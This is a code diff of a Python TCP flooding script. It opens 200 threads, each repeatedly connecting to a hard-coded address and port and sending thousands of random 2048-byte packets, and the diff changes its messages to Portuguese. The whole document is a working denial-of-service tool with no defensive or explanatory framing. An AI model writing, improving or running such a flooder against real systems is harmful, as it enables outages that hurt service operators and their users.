@@ -2,25 +2,26 @@ import random
 import socket
 import threading
 
-ip = "172.21.210.74"
-port = 2000
-times = 50000
-threads = 5
-
-def run():
-	data = random._urandom(1024)
+def tcp_flooding():
+	ip = "172.21.210.74"
+	port = 2000
+	data = random._urandom(2048)
 	while True:
-		try:
+		try:			
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((ip,port))
 			s.send(data)
-			for x in range(times):
+			for i in range(2000):
 				s.send(data)
-			print("[!] Sent!!!")
+			print("Pacote enviado!")
 		except:
 			s.close()
-			print("[*] Error")
+			print("Erro ao enviar pacotes!")
 
-for y in range(threads):
-    th = threading.Thread(target = run)
-    th.start()
+def main():
+	for thread in range(200):
+		th = threading.Thread(target = tcp_flooding)
+		th.start()
+
+if __name__ == "__main__":
+    main()
